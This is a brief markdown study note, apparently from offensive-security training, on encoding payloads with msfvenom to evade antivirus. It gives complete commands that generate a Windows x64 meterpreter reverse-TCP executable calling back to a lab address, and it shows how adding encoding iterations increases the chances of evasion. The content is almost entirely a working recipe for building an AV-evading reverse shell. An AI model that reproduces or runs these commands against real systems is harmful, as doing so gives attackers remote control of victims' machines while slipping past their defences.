# Encoding Payloads

Encoding will allow us to possible bypass antivirus  
Shellcode - This is essentially the payload  

```mfsvenom --list encoders```
- x86/shikata_ga_nai
- cmd/powershell_base64

Example -- ```msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.50.64 LPORT=1234 -e x86/shikata_ga_nai -f exe > /home/secops/Desktop/encoded_payloadx64.exe```  
This will encode the payload once

Increasing iterations of encoding will increase chances of evading antivirus  
To Increase us -i (number)  
```msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.50.64 LPORT=1234 -i 10 -e x86/shikata_ga_nai -f exe > /home/secops/Desktop/encoded_payloadx64.exe``` 
